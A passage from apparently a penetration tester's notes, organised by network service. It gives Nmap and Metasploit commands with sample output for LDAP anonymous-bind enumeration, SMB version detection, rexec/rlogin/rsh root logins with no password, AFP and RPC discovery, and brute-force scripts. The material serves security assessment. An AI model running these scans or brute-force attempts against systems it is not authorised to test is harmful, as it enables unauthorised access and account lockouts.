<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 389 --script ldap-rootdse &lt;host&gt;
</span><span class='line'>nmap -p 389 --script ldap-rootdse 172.16.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 23:05 IST
</span><span class='line'>Nmap scan report for 172.16.xx.xx
</span><span class='line'>Host is up (0.015s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>389/tcp open  ldap
</span><span class='line'>| ldap-rootdse: 
</span><span class='line'>| LDAP Results
</span><span class='line'>|   &lt;ROOT&gt;
</span><span class='line'>|       currentTime: 20160503173447.0Z
</span><span class='line'>|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com
</span><span class='line'>|       defaultNamingContext: DC=xxxpcx,DC=com
</span><span class='line'>|       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       rootDomainNamingContext: DC=xxxpcx,DC=com
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.319
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.801
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.473
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.528
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.417
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.619
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.841
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.529
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.805
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.521
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.970
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1338
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.474
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1339
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1340
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1413
</span><span class='line'>|       supportedControl: 2.16.xx.xx.113730.3.4.9
</span><span class='line'>|       supportedControl: 2.16.xx.xx.113730.3.4.10
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1504
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1852
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.802
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1907
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1948
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1974
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1341
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2026
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2064
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2065
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2066
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2090
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2205
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2204
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2206
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2211
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2239
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2255
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2256
</span><span class='line'>|       supportedLDAPVersion: 3
</span><span class='line'>|       supportedLDAPVersion: 2
</span><span class='line'>|       supportedLDAPPolicies: MaxPoolThreads
</span><span class='line'>|       supportedLDAPPolicies: MaxPercentDirSyncRequests
</span><span class='line'>|       supportedLDAPPolicies: MaxDatagramRecv
</span><span class='line'>|       supportedLDAPPolicies: MaxReceiveBuffer
</span><span class='line'>|       supportedLDAPPolicies: InitRecvTimeout
</span><span class='line'>|       supportedLDAPPolicies: MaxConnections
</span><span class='line'>|       supportedLDAPPolicies: MaxConnIdleTime
</span><span class='line'>|       supportedLDAPPolicies: MaxPageSize
</span><span class='line'>|       supportedLDAPPolicies: MaxBatchReturnMessages
</span><span class='line'>|       supportedLDAPPolicies: MaxQueryDuration
</span><span class='line'>|       supportedLDAPPolicies: MaxTempTableSize
</span><span class='line'>|       supportedLDAPPolicies: MaxResultSetSize
</span><span class='line'>|       supportedLDAPPolicies: MinResultSets
</span><span class='line'>|       supportedLDAPPolicies: MaxResultSetsPerConn
</span><span class='line'>|       supportedLDAPPolicies: MaxNotificationPerConn
</span><span class='line'>|       supportedLDAPPolicies: MaxValRange
</span><span class='line'>|       supportedLDAPPolicies: MaxValRangeTransitive
</span><span class='line'>|       supportedLDAPPolicies: ThreadMemoryLimit
</span><span class='line'>|       supportedLDAPPolicies: SystemMemoryLimitPercent
</span><span class='line'>|       highestCommittedUSN: 70892
</span><span class='line'>|       supportedSASLMechanisms: GSSAPI
</span><span class='line'>|       supportedSASLMechanisms: GSS-SPNEGO
</span><span class='line'>|       supportedSASLMechanisms: EXTERNAL
</span><span class='line'>|       supportedSASLMechanisms: DIGEST-MD5
</span><span class='line'>|       dnsHostName: SCN-DC01.xxxpcx.com
</span><span class='line'>|       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM
</span><span class='line'>|       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.800
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.1670
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.1791
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.1935
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.2080
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.2237
</span><span class='line'>|       isSynchronized: TRUE
</span><span class='line'>|       isGlobalCatalogReady: TRUE
</span><span class='line'>|       domainFunctionality: 3
</span><span class='line'>|       forestFunctionality: 3
</span><span class='line'>|_      domainControllerFunctionality: 6
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/ldap-search.html">ldap-search.nse</a>: Attempts to perform an LDAP search and returns all matches.

If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
</span><span class='line'>ldap.qfilter=users,ldap.attrib=sAMAccountName' &lt;host&gt;
</span><span class='line'>
</span><span class='line'>nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
</span><span class='line'>ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' &lt;host&gt;</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/ldap-brute.html">ldap-brute.nse</a>: Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments.

This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceed the amount of allowed tries, accounts will be locked out. This usually happens very quickly.</li>
</ol>


<p>Anonymous LDAP Binding allows a client to connect and search the directory ( bind and search) without logging in. You do not need to include binddn and bindpasswd.</p>

<p>If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
</span><span class='line'>-h ldap server
</span><span class='line'>-p port of ldap
</span><span class='line'>-x simple authentication
</span><span class='line'>-b search base
</span><span class='line'>-s scope is defined as base</span></code></pre></td></tr></table></div></figure>


<p>Sample Output</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
</span><span class='line'># extended LDIF
</span><span class='line'>#
</span><span class='line'># LDAPv3
</span><span class='line'># base &lt;&gt; with scope baseObject
</span><span class='line'># filter: (objectClass=*)
</span><span class='line'># requesting: * + 
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'>dn:
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: OpenLDAProotDSE
</span><span class='line'>structuralObjectClass: OpenLDAProotDSE
</span><span class='line'>configContext: cn=config
</span><span class='line'>namingContexts: dc=example,dc=com
</span><span class='line'>supportedControl: 1.3.xx.xx.4.1.4203.1.9.1.1
</span><span class='line'>supportedControl: 2.16.xx.xx.113730.3.4.18
</span><span class='line'>supportedControl: 2.16.xx.xx.113730.3.4.2
</span><span class='line'>supportedControl: 1.3.xx.xx.4.1.4203.1.10.1
</span><span class='line'>supportedControl: 1.2.xx.xx.1.4.319
</span><span class='line'>supportedControl: 1.2.xx.xx.1.334810.2.3
</span><span class='line'>supportedControl: 1.2.xx.xx.1.3344810.2.3
</span><span class='line'>supportedControl: 1.3.xx.xx.1.13.2
</span><span class='line'>supportedControl: 1.3.xx.xx.1.13.1
</span><span class='line'>supportedControl: 1.3.xx.xx.1.12
</span><span class='line'>supportedExtension: 1.3.xx.xx.4.1.4203.1.11.1
</span><span class='line'>supportedExtension: 1.3.xx.xx.4.1.4203.1.11.3
</span><span class='line'>supportedFeatures: 1.3.xx.xx.1.14
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.1
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.2
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.3
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.4
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.5
</span><span class='line'>supportedLDAPVersion: 3
</span><span class='line'>entryDN:
</span><span class='line'>subschemaSubentry: cn=Subschema
</span><span class='line'>
</span><span class='line'># search result
</span><span class='line'>search: 2
</span><span class='line'>result: 0 Success
</span><span class='line'>
</span><span class='line'># numResponses: 2
</span><span class='line'># numEntries: 1</span></code></pre></td></tr></table></div></figure>


<p>Once you are aware of the base name in the above example &ldquo;example.com&rdquo; we can query for ldap users etc. by</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -h 10.10.xx.xx -p 389 -x -b "dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>Sample Output</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># johnsmith, EXAUSERS, People, example.com
</span><span class='line'>dn: uid=johnsmith,ou=EXAUSERS,ou=People,dc=example,dc=com
</span><span class='line'>displayName: John Smith
</span><span class='line'>ntUserLastLogon: 130150432350834365
</span><span class='line'>givenName: John
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: person
</span><span class='line'>objectClass: organizationalperson
</span><span class='line'>objectClass: inetOrgPerson
</span><span class='line'>objectClass: ntUser
</span><span class='line'>objectClass: shadowAccount
</span><span class='line'>uid: johnsmith
</span><span class='line'>cn: John Smith
</span><span class='line'>ntUserCodePage: 0
</span><span class='line'>ntUserDomainId: johnsmith
</span><span class='line'>ntUserLastLogoff: 0
</span><span class='line'>ntUniqueId: 75ac21092c755e42b2129a224eb328dd
</span><span class='line'>ntUserDeleteAccount: true
</span><span class='line'>ntUserAcctExpires: 9223372036854775807
</span><span class='line'>sn: John</span></code></pre></td></tr></table></div></figure>


<p>Things to add in LDAP &ndash; User authentication and Jxplorer</p>

<h3>SMB | Port 445</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>SMB Version Detection</strong> which provides the operating system version.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smb/smb_version
</span><span class='line'>services -p 445 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BPC13B0843) (domain:XXX)
</span><span class='line'>[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BWK14F0040) (domain:XXX)</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>rexec | Port 512</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>rexec Authentication Scanner</strong> to find if there is any open shell.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/scanner/rservices/rexec_login
</span><span class='line'>services -p 512 -u -R</span></code></pre></td></tr></table></div></figure>
Sample output with the username root and empty password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
</span><span class='line'>[-] Result: Where are you?
</span><span class='line'>[*] 10.10.xx.xx:512 - Starting rexec sweep
</span><span class='line'>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
</span><span class='line'>[*] 10.10.xx.xx:512 - Starting rexec sweep
</span><span class='line'>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
</span><span class='line'>[+] 10.10.xx.xx:512, rexec 'root' : ''</span></code></pre></td></tr></table></div></figure>

The above can be accessed using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rlogin &lt;ipaddress&gt;</span></code></pre></td></tr></table></div></figure>
</li>

</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/rexec-brute.html">rexec-brute.nse</a>: Performs brute force password auditing against the classic UNIX rexec (remote exec) service.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 512 --script rexec-brute &lt;ip&gt;</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>rlogin | Port 513</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>rlogin Authentication Scanner</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/rservices/rlogin_login
</span><span class='line'>services -p 513 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:513, rlogin 'root' from 'root' with no password.
</span><span class='line'>[+] 10.10.xx.xx:513, rlogin 'root' from 'root' with no password.</span></code></pre></td></tr></table></div></figure>
Note: In a recent engagement just doing the "rlogin IP" using the root shell provided me the root shell, where-as few IP address asked for password. Also, One IP for which rexec_login shows failed, was able to login using rlogin.

Maybe refer: Metasploitable 2 : DOC-1875 document.
</li>
</ol>


<h3>RSH | port 514</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>rsh Authentication Scanner</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/rservices/rsh_login
</span><span class='line'>services -p 514 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:514, rsh 'root' from 'root' with no password.
</span><span class='line'>[*] 10.11.xx.xx:514 RSH - Attempting rsh with username 'root' from 'root'
</span><span class='line'>[+] 10.11.xx.xx:514, rsh 'root' from 'root' with no password.</span></code></pre></td></tr></table></div></figure>

Sample Run:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rsh 10.11.xx.xx whoami
</span><span class='line'>Integrated PrintNet Enterprise</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>AFP | Apple Filing Protocol | Port 548</h3>

<p>AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.</p>

<p><strong>Metasploit</strong> has two auxiliary modules available.</p>

<ol>
<li><strong>Apple Filing Protocol Info Enumerator</strong>: 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/afp/afp_server_info
</span><span class='line'>services -p 548 -u -S AFP -R</span></code></pre></td></tr></table></div></figure>
Sample output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] AFP 10.11.xx.xx Scanning...
</span><span class='line'>[*] AFP 10.11.xx.xx:548:548 AFP:
</span><span class='line'>[*] AFP 10.11.xx.xx:548 Server Name: example-airport-time-capsule 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Server Flags: 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Super Client: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  UUIDs: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  UTF8 Server Name: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Open Directory: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Reconnect: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Server Notifications: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  TCP/IP: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Server Signature: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Server Messages: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Password Saving Prohibited: false 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Password Changing: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Copy File: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Machine Type: TimeCapsule8,119 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  AFP Versions: AFP3.3, AFP3.2, AFP3.1 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  UAMs: DHCAST128, DHX2, SRP, Recon1
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Server Signature: 4338364c4e355635463948350069672d
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Server Network Address: 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  10.11.4.76:548 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  [fe80:0009:0000:0000:9272:40ff:fe0b:99b7]:548 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  10.11.4.76 
</span><span class='line'>[*] AFP 10.11.xx.xx:548   UTF8 Server Name: Example's AirPort Time Capsule
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>Apple Filing Protocol Login Utility</strong> which attempts to bruteforce authentication credentials for AFP.
</li>
</ol>


<p>In <strong>Nmap</strong>, we have</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html">afp-serverinfo.nse</a>: Shows AFP server information.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-brute.html">afp-brute.nse</a>: Performs password guessing against Apple Filing Protocol (AFP).</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-ls.html">afp-ls.nse</a>: Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-showmount.html">afp-showmount.nse</a>: Shows AFP shares and ACLs.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html">afp-path-vuln.nse</a>: Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.</li>
</ol>


<h3>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</h3>

<p>Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.</p>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>Endpoint Mapper Service Discovery</strong>: This module can be used to obtain information from the Endpoint Mapper service
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/endpoint_mapper</span></code></pre></td></tr></table></div></figure></li>
<li><strong>Hidden DCERPC Service Discovery</strong>:   This module will query the endpoint mapper and make a list of all ncacn_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/hidden</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>Remote Management Interface Discovery</strong>:   This module can be used to obtain information from the Remote Management Interface DCERPC service.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/management</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>DCERPC TCP Service Auditor</strong>: Determine what DCERPC services are accessible over a TCP port.

